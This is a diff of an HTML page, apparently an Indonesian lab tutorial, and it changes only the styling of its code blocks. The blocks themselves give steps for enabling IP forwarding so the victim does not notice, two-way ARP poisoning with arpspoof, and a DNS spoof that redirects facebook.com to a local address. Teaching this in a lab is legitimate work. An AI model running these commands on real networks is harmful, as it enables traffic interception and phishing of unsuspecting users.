@@ -38,10 +38,11 @@
                             <div class="collapse-content">
                                 <p>Cek IP address dan konektivitas (ping):</p>
                                 <div class="mockup-code bg-base-300 text-base-content mt-2">
-                                    <pre data-prefix="$"><code>ip a</code></pre>
+                                    <pre data-prefix="$" class="whitespace-pre-wrap break-all"><code>ip a</code></pre>
                                 </div>
                                 <div class="mockup-code bg-base-300 text-base-content mt-2">
-                                    <pre data-prefix="$"><code>ping &lt;victim_ip&gt;</code></pre>
+                                    <pre data-prefix="$"
+                                        class="whitespace-pre-wrap break-all"><code>ping &lt;victim_ip&gt;</code></pre>
                                 </div>
                             </div>
                         </div>
@@ -55,7 +56,8 @@
                                 <p>Aktifkan forwarding agar traffic tetap bisa lewat (agar korban tidak curiga putus
                                     koneksi):</p>
                                 <div class="mockup-code bg-base-300 text-base-content mt-2 max-w-full overflow-x-auto">
-                                    <pre data-prefix="$"><code>echo 1 > /proc/sys/net/ipv4/ip_forward</code></pre>
+                                    <pre data-prefix="$"
+                                        class="whitespace-pre-wrap break-all"><code>echo 1 > /proc/sys/net/ipv4/ip_forward</code></pre>
                                 </div>
                             </div>
                         </div>
@@ -68,11 +70,11 @@
                             <div class="collapse-content">
                                 <p>Lakukan ARP poisoning (Man-in-the-Middle) dua arah:</p>
                                 <div class="mockup-code bg-base-300 text-base-content mt-2 max-w-full overflow-x-auto">
-                                    <pre
+                                    <pre class="whitespace-pre-wrap break-all"
                                         data-prefix="$"><code>arpspoof -i eth0 -t &lt;victim_ip&gt; &lt;gateway_ip&gt;</code></pre>
                                 </div>
                                 <div class="mockup-code bg-base-300 text-base-content mt-2 max-w-full overflow-x-auto">
-                                    <pre
+                                    <pre class="whitespace-pre-wrap break-all"
                                         data-prefix="$"><code>arpspoof -i eth0 -t &lt;gateway_ip&gt; &lt;victim_ip&gt;</code></pre>
                                 </div>
                             </div>
@@ -86,11 +88,13 @@
                             <div class="collapse-content">
                                 <p>Buat file <code>dns.txt</code> berisi mapping domain palsu:</p>
                                 <div class="mockup-code bg-base-300 text-base-content mt-2 max-w-full overflow-x-auto">
-                                    <pre data-prefix="$"><code>echo "facebook.com 192.168.56.100" > dns.txt</code></pre>
+                                    <pre data-prefix="$"
+                                        class="whitespace-pre-wrap break-all"><code>echo "facebook.com 192.168.56.100" > dns.txt</code></pre>
                                 </div>
                                 <p class="mt-4">Jalankan dnsspoof:</p>
                                 <div class="mockup-code bg-base-300 text-base-content mt-2 max-w-full overflow-x-auto">
-                                    <pre data-prefix="$"><code>dnsspoof -i eth0 -f dns.txt</code></pre>
+                                    <pre data-prefix="$"
+                                        class="whitespace-pre-wrap break-all"><code>dnsspoof -i eth0 -f dns.txt</code></pre>
                                 </div>
                             </div>
                         </div>
